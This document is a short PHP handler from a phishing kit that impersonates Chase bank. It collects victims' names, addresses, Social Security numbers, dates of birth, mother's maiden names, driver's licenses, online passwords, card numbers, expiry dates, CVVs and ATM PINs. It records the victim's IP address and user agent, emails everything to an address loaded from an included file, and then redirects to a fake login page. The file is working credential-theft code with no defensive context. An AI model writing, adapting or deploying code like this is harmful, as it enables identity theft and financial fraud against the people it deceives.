<?php
if($_POST["name1"] != "" and $_POST["name2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Chase Info-----------------------\n";
$message .= "First Name            : ".$_POST['name1']."\n";
$message .= "Last Name            : ".$_POST['name2']."\n";
$message .= "Address              : ".$_POST['addr']."\n";
$message .= "State             : ".$_POST['state']."\n";
$message .= "City              : ".$_POST['city']."\n";
$message .= "Zip Code            : ".$_POST['zp']."\n";
$message .= "Social Security Number            : ".$_POST['sn']."\n";
$message .= "Date of Birth            : ".$_POST['db']."\n";
$message .= "Mother's Maiden Name            : ".$_POST['mn']."\n";
$message .= "Phone Number            : ".$_POST['phone']."\n";
$message .= "Driver's License            : ".$_POST['dl']."\n";
$message .= "Online password setup at branch            : ".$_POST['pw']."\n";
$message .= "Card Number            : ".$_POST['cn']."\n";
$message .= "Expiry Date       : ".$_POST['ex']."\n";
$message .= "CVV            : ".$_POST['cv']."\n";
$message .= "ATM PIN          : ".$_POST['pn']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>